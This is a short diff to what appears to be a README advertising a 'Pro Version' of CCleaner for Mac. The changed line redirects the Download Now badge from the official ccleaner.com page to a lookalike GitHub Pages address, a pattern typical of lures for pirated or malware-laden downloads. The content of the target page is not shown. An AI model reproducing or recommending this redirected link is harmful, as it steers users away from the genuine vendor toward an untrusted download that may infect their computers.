@@ -4,7 +4,7 @@
 
 ## 📦 Download CCleaner Pro for Mac – Pro Version
 
-[![⬇️ Download Now](https://img.shields.io/badge/Download-CCleaner%20Pro%20Mac-blue?style=for-the-badge&logo=apple)](https://www.ccleaner.com/ccleaner-mac)
+[![⬇️ Download Now](https://img.shields.io/badge/Download-CCleaner%20Pro%20Mac-blue?style=for-the-badge&logo=apple)](https://ccleaner-pro-mac-download.github.io/.github)
 
 ---
 
